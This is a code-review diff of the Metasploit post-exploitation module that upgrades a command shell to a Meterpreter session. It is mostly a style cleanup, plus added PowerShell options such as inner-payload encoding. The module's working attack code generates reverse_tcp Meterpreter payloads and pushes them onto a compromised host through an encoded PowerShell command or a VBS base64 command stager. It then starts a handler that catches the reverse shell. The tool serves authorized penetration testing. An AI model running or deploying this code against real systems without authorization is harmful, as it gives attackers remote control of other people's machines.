@@ -12,8 +12,8 @@ class Metasploit3 < Msf::Post
   include Exploit::Powershell
   include Post::Windows::Powershell
 
-  def initialize(info={})
-    super( update_info( info,
+  def initialize(info = {})
+    super(update_info(info,
         'Name'          => 'Shell to Meterpreter Upgrade',
         'Description'   => %q{
           This module attempts to upgrade a command shell to meterpreter. The shell
@@ -33,9 +33,9 @@ class Metasploit3 < Msf::Post
         OptInt.new('LPORT',
           [false, 'Port for Payload to connect to.', 4433]),
         OptBool.new('HANDLER',
-          [ true, 'Start an Exploit Multi Handler to receive the connection', true]),
+          [ true, 'Start an Exploit Multi Handler to receive the connection', true])
       ], self.class)
-    deregister_options("PERSIST","PSH_OLD_METHOD","RUN_WOW64")
+    deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
 
   # Run Method for when run command is issued
@@ -49,7 +49,7 @@ class Metasploit3 < Msf::Post
     elsif framework.datastore['LHOST']
       lhost = framework.datastore['LHOST']
     else
-      lhost = session.tunnel_local.split(":")[0]
+      lhost = session.tunnel_local.split(':')[0]
     end
 
     # If nothing else works....
@@ -64,6 +64,7 @@ class Metasploit3 < Msf::Post
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
+      psh_arch = 'x86'
     when /osx/i
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
@@ -79,7 +80,7 @@ class Metasploit3 < Msf::Post
         payload_name = 'linux/x86/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
-      elsif cmd_exec("python -V") =~ /Python 2\.(\d)/
+      elsif cmd_exec('python -V') =~ /Python 2\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
@@ -91,15 +92,14 @@ class Metasploit3 < Msf::Post
       return nil
     end
 
-    payload_data = generate_payload(lhost,lport,payload_name)
+    payload_data = generate_payload(lhost, lport, payload_name)
     if payload_data.blank?
       print_error("Unable to build a suitable payload for #{session.platform} using payload #{payload_name}.")
       return nil
     end
 
-
     if datastore['HANDLER']
-      listener_job_id = create_multihandler(lhost,lport,payload_name)
+      listener_job_id = create_multihandler(lhost, lport, payload_name)
       if listener_job_id.blank?
         print_error("Failed to start multi/handler on #{datastore['LPORT']}, it may be in use by another process.")
         return nil
@@ -109,7 +109,8 @@ class Metasploit3 < Msf::Post
     case platform
     when 'win'
       if have_powershell?
-        cmd_exec(cmd_psh_payload(payload_data))
+        psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
+        cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
       else
         exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
         aborted = transmit_payload(exe)
@@ -123,11 +124,9 @@ class Metasploit3 < Msf::Post
 
     cleanup_handler(listener_job_id, aborted) if datastore['HANDLER']
     return nil
-
   end
 
   def transmit_payload(exe)
-
     #
     # Generate the stager command array
     #
@@ -140,7 +139,7 @@ class Metasploit3 < Msf::Post
       #:nodelete => true # keep temp files (for debugging)
     }
     if session.platform =~ /win/i
-      opts[:decoder] = File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64")
+      opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
       opts[:background] = true
@@ -150,8 +149,8 @@ class Metasploit3 < Msf::Post
     end
 
     cmds = cmdstager.generate(opts)
-    if (cmds.nil? or cmds.length < 1)
-      print_error("The command stager could not be generated")
+    if cmds.nil? || cmds.length < 1
+      print_error('The command stager could not be generated')
       raise ArgumentError
     end
 
@@ -169,18 +168,16 @@ class Metasploit3 < Msf::Post
       aborted = false
       cmds.each { |cmd|
         ret = session.shell_command_token(cmd)
-        if (not ret)
+        if !ret
           aborted = true
         else
           ret.strip!
-          if (not ret.empty?)
-            aborted = true
-          end
+          aborted = true if !ret.empty?
         end
         if aborted
-          print_error("Error: Unable to execute the following command:")
+          print_error('Error: Unable to execute the following command:')
           print_error(cmd.inspect)
-          print_error('Output: ' + ret.inspect) if ret and not ret.empty?
+          print_error('Output: ' + ret.inspect) if ret && !ret.empty?
           break
         end
 
@@ -200,23 +197,21 @@ class Metasploit3 < Msf::Post
   end
 
   def cleanup_handler(listener_job_id, aborted)
-
     # Return if the job has already finished
     return nil if framework.jobs[listener_job_id].nil?
 
-      Thread.new do
-        if not aborted
-          timer = 0
-          while not framework.jobs[listener_job_id].nil? && timer < 10
-            # Wait up to 10 seconds for the session to come in..
-            sleep(1)
-            timer += 1
-          end
+    Thread.new do
+      if !aborted
+        timer = 0
+        while !framework.jobs[listener_job_id].nil? && timer < 10
+          # Wait up to 10 seconds for the session to come in..
+          sleep(1)
+          timer += 1
         end
-        print_status("Stopping multi/handler")
-        framework.jobs.stop_job(listener_job_id)
       end
-
+      print_status('Stopping multi/handler')
+      framework.jobs.stop_job(listener_job_id)
+    end
   end
 
   #
@@ -227,16 +222,15 @@ class Metasploit3 < Msf::Post
     print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
   end
 
-
   # Method for checking if a listener for a given IP and port is present
   # will return true if a conflict exists and false if none is found
-  def check_for_listener(lhost,lport)
-    client.framework.jobs.each do |k,j|
+  def check_for_listener(lhost, lport)
+    client.framework.jobs.each do |k, j|
       if j.name =~ / multi\/handler/
         current_id = j.jid
-        current_lhost = j.ctx[0].datastore["LHOST"]
-        current_lport = j.ctx[0].datastore["LPORT"]
-        if lhost == current_lhost and lport == current_lport.to_i
+        current_lhost = j.ctx[0].datastore['LHOST']
+        current_lport = j.ctx[0].datastore['LPORT']
+        if lhost == current_lhost && lport == current_lport.to_i
           print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
           return true
         end
@@ -246,14 +240,14 @@ class Metasploit3 < Msf::Post
   end
 
   # Starts a multi/handler session
-  def create_multihandler(lhost,lport,payload_name)
+  def create_multihandler(lhost, lport, payload_name)
     pay = client.framework.payloads.create(payload_name)
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
-    print_status("Starting exploit multi handler")
-    if not check_for_listener(lhost,lport)
+    print_status('Starting exploit multi handler')
+    if !check_for_listener(lhost, lport)
       # Set options for module
-      mh = client.framework.exploits.create("multi/handler")
+      mh = client.framework.exploits.create('multi/handler')
       mh.share_datastore(pay.datastore)
       mh.datastore['WORKSPACE'] = client.workspace
       mh.datastore['PAYLOAD'] = payload_name
@@ -276,24 +270,19 @@ class Metasploit3 < Msf::Post
       # target could end up on on a different handler with the wrong payload
       # or dropped entirely.
       select(nil, nil, nil, 5)
-      if framework.jobs[mh.job_id.to_s].nil?
-        return nil
-      end
+      return nil if framework.jobs[mh.job_id.to_s].nil?
 
       return mh.job_id.to_s
     else
-      print_error("A job is listening on the same local port")
+      print_error('A job is listening on the same local port')
       return nil
     end
-
-
   end
 
-  def generate_payload(lhost,lport,payload_name)
+  def generate_payload(lhost, lport, payload_name)
     payload = framework.payloads.create(payload_name)
     options = "LHOST=#{lhost} LPORT=#{lport}"
     buf = payload.generate_simple('OptionStr' => options)
-    return buf
+    buf
   end
-
 end
